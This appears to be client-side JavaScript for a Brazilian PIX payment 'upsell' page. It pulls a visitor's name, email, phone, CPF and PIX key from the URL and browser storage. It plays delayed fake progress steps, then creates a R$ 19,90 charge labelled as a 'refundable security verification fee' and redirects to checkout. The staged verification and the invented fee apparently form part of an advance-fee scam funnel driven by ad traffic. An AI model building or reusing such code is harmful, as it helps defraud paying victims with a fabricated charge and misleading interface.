// Gerador automático de PIX para o Upsell de R$ 19,90 usando SpeedPag
document.addEventListener('DOMContentLoaded', async () => {
    activateStep(1);
    const dados = recuperarDados();
    await delay(700);
    completeStep(1);

    activateStep(2);
    const res = await criarTransacao(dados);
    if (!res.success) {
        mostrarErro(res.error || 'Erro ao gerar PIX. Tente novamente.');
        return;
    }
    await delay(700);
    completeStep(2);

    activateStep(3);
    salvarDadosTransacao(res.data, dados);
    await delay(500);
    completeStep(3);

    await delay(400);
    redirecionarParaPix(res.data, dados);
});

function recuperarDados() {
    const params = new URLSearchParams(window.location.search);
    const dados = {};
    
    dados.nome = params.get('nome') || localStorage.getItem('usuario_nome') || 'Cliente';
    dados.email = params.get('email') || localStorage.getItem('usuario_email') || 'cliente@email.com';
    dados.telefone = params.get('telefone') || localStorage.getItem('pix_chave') || localStorage.getItem('usuario_telefone') || '11999998888';
    dados.cpf = params.get('cpf') || localStorage.getItem('usuario_cpf') || '';
    dados.pix = params.get('pix') || localStorage.getItem('pix_chave') || '';

    ['utm_source', 'utm_medium', 'utm_campaign', 'utm_term', 'utm_content', 'sck', 'src', 'fbclid'].forEach(p => {
        const v = params.get(p) || localStorage.getItem(p);
        if (v) dados[p] = v;
    });

    return dados;
}

async function criarTransacao(dados) {
    try {
        const payload = {
            nome: dados.nome,
            email: dados.email,
            cpf: dados.cpf,
            telefone: dados.telefone,
            amount: 1990, // R$ 19,90
            produto: 'Verificação de Segurança (Taxa Reembolsável)',
            src: dados.src || dados.utm_source,
            sck: dados.sck,
            utm_source: dados.utm_source,
            utm_medium: dados.utm_medium,
            utm_campaign: dados.utm_campaign,
            utm_term: dados.utm_term,
            utm_content: dados.utm_content
        };

        const resp = await fetch('/api/create-payment', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(payload)
        });

        const rawText = await resp.text();
        let json;
        try {
            json = JSON.parse(rawText);
        } catch (e) {
            console.error('Resposta não-JSON no upsell:', rawText);
            return { success: false, error: 'Erro de comunicação com o servidor (' + resp.status + ')' };
        }
        return json;
    } catch (e) {
        return { success: false, error: 'Falha na conexão com o servidor' };
    }
}

function salvarDadosTransacao(transacao, dados) {
    const id = transacao.id;
    const qrCode = transacao.qr_code;
    
    localStorage.setItem('pix_txid_up1', id);
    if (qrCode) localStorage.setItem('pix_code_up1', qrCode);
    localStorage.setItem('pix_valor_up1', '19,90');
    localStorage.setItem('pix_txid', id);
    if (qrCode) localStorage.setItem('pix_code', qrCode);
    localStorage.setItem('pix_valor', '19,90');
}

function redirecionarParaPix(transacao, dados) {
    const params = new URLSearchParams();
    if (transacao.id) params.append('id', transacao.id);
    if (transacao.qr_code) params.append('code', transacao.qr_code);
    params.append('valor', '19,90');

    ['utm_source', 'utm_medium', 'utm_campaign', 'utm_term', 'utm_content', 'sck', 'src', 'fbclid'].forEach(p => {
        if (dados[p]) params.append(p, dados[p]);
    });

    window.location.href = '/checkout/pix.html?' + params.toString();
}

function activateStep(num) {
    document.querySelectorAll('.step').forEach((s, idx) => {
        if (idx + 1 === num) {
            s.classList.add('active');
        }
    });
}

function completeStep(num) {
    document.querySelectorAll('.step').forEach((s, idx) => {
        if (idx + 1 === num) {
            s.classList.remove('active');
            s.classList.add('completed');
            const icon = s.querySelector('.step-icon');
            if (icon) icon.innerHTML = '✓';
        }
    });
}

function mostrarErro(msg) {
    const el = document.getElementById('errorMessage');
    if (el) {
        el.innerHTML = msg + '<br><button class="btn-retry" onclick="location.reload()">Tentar Novamente</button>';
        el.classList.add('show');
    }
    const icon = document.getElementById('loadingIcon');
    if (icon) icon.style.display = 'none';
}

function delay(ms) {
    return new Promise(r => setTimeout(r, ms));
}
